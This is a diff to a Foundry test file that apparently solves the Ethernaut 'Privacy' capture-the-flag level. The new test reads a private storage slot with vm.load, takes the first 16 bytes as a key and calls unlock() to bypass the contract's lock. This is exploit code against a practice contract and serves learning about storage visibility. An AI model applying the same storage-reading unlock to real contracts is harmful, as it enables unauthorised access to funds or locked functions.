@@ -1,6 +1,3 @@
-// 0x11343d543778213221516D004ED82C45C3c8788B
-
-
 // SPDX-License-Identifier: MIT
 pragma solidity >=0.8.0;
 
@@ -9,15 +6,17 @@ import "../utils.sol";
 
 contract PrivacyTest is Test {
   address internal challengeAddress;
-  Building internal building;
 
   function setUp() public {
-    challengeAddress = utils.createLevelInstance(0xaB4F3F2644060b2D960b0d88F0a42d1D27484687);
-    building = new Building(challengeAddress);
+    challengeAddress = utils.createLevelInstance(0x11343d543778213221516D004ED82C45C3c8788B);
   }
 
   function testExploit() public {
-    building.solveChallenge();
+    // variables of this data array are at slots 3, 4, and 5
+    bytes16 key = bytes16(vm.load(challengeAddress, bytes32(uint256(5))));
+
+    (bool success,) = challengeAddress.call(abi.encodeWithSignature("unlock(bytes16)", key));
+    success;
 
     utils.submitLevelInstance(challengeAddress);
   }
